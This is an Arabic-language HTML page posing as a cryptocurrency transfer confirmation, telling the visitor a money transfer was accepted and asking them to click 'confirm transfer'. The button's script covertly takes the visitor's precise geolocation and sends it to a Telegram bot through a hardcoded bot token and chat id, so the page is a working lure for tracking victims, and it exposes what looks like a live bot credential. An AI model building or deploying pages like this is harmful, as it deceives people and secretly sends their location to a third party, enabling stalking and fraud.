<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>عملات رقمية USDT وبيتكوين</title>
  <style>
    body {
      background-color: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }
    img {
      width: 120px;
      margin-top: 20px;
    }
    h1 {
      font-size: 26px;
      margin-bottom: 10px;
      color: gold;
    }
    p {
      font-size: 18px;
      margin-bottom: 30px;
    }
    button {
      font-size: 18px;
      background-color: gold;
      border: none;
      padding: 12px 25px;
      border-radius: 8px;
      color: black;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo">
  <h1>عملات رقمية USDT وبيتكوين</h1>
  <p>تهانينا، تم قبول الطلب لتحويل المال</p>
  <button onclick="getLocation()">تأكيد التحويل</button>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      }
    }

    function sendToTelegram(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";  // تأكد أنه صحيح
      const chat_id = "7485197107";  // تأكد أنه صحيح

      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}`;

      fetch(url)
        .then(response => console.log('تم الإرسال للبوت'))
        .catch(error => console.error('فشل الإرسال:', error));
    }

    function showError(error) {
      console.error('فشل تحديد الموقع:', error);
    }
  </script>
</body>
</html>
